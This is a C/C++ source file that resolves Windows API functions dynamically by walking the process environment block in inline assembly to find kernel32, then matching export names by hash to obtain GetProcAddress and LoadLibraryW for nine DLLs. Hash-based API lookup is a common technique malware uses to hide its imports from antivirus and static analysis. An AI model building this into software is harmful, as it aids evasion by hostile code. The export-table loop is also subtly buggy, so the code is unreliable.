#include "Api.h"

HMODULE GetKernel32()
{
	__asm
	{
		mov eax, fs: [0x30]
		mov eax, [eax + 0xC]
		mov eax, [eax + 0xC]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x18]
	}
}

LPVOID GetApiAddr(HMODULE hModule, UINT funcHash)
{
	PIMAGE_DOS_HEADER pDOSHdr = (PIMAGE_DOS_HEADER)hModule;

	if (pDOSHdr->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDOSHdr->e_lfanew);

	if (pNTHdr->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	if ((pNTHdr->FileHeader.Characteristics & IMAGE_FILE_DLL) == NULL || 
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL || 
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == NULL)
	{
		return NULL;
	}

	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule +
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pdwAddress = (PDWORD)((LPBYTE)hModule + pIED->AddressOfFunctions);
	PDWORD pdwNames = (PDWORD)((LPBYTE)hModule + pIED->AddressOfNames);
	PWORD pwOrd = (PWORD)((LPBYTE)hModule + pIED->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pIED->AddressOfFunctions; i++)
	{
		LPSTR pszFuncName = (LPSTR)((LPBYTE)hModule + pdwNames[i]);

		if (CalcHash((byte*)pszFuncName, strLen(pszFuncName)) == funcHash)
		{
			return (LPVOID)((LPBYTE)hModule + pdwAddress[pwOrd[i]]);
		}
	}
}

static HMODULE hKernel32 = NULL;
static LPVOID ptrGetProcAddress = NULL, ptrLoadLibraryW = NULL;

void ApiInit()
{
	if (!hKernel32)
	{
		hKernel32 = GetKernel32();
	}

	if (!ptrGetProcAddress)
	{
		ptrGetProcAddress = (T_GetProcAddress)GetApiAddr(hKernel32, hashGetProcAddress);
	}

	if (!ptrLoadLibraryW)
	{
		ptrLoadLibraryW = (T_LoadLibraryW)GetApiAddr(hKernel32, hashLoadLibraryW);
	}
}

void strCpyW(LPWSTR dest, LPCWSTR src)
{
	while (*src)
	{
		*dest++ = *src++;
	}
	*dest = '\0';
}

static HMODULE DllHandls[9];

LPVOID GetWinAPI(int dll, LPCSTR funcName) 
{
	ApiInit();

	static LPVOID funcAddr = NULL;
	static wchar_t dllName[100];

	switch (dll)
	{
	case 0:
		strCpyW(dllName, StaticData::User32dll);
		break;
	case 1:
		strCpyW(dllName, StaticData::Kernel32dll);
		break;
	case 2:
		strCpyW(dllName, StaticData::Shlwapidll);
		break;
	case 3:
		strCpyW(dllName, StaticData::Shell32dll);
		break;
	case 4:
		strCpyW(dllName, StaticData::Wininetdll);
		break;
	case 5:
		strCpyW(dllName, StaticData::Msvcrtdll);
		break;
	case 6:
		strCpyW(dllName, StaticData::Ntdll);
		break;
	case 7:
		strCpyW(dllName, StaticData::Ole32dll);
		break;
	case 8:
		strCpyW(dllName, StaticData::Advapi32dll);
		break;
	default:
		return NULL;
		break;
	}

	HMODULE hDll = DllHandls[dll];

	if (!hDll)
	{
		hDll = ((T_LoadLibraryW)ptrLoadLibraryW)(dllName);
		DllHandls[dll] = hDll;
	}

	funcAddr = ((T_GetProcAddress)ptrGetProcAddress)(hDll, funcName);

	return funcAddr;
}
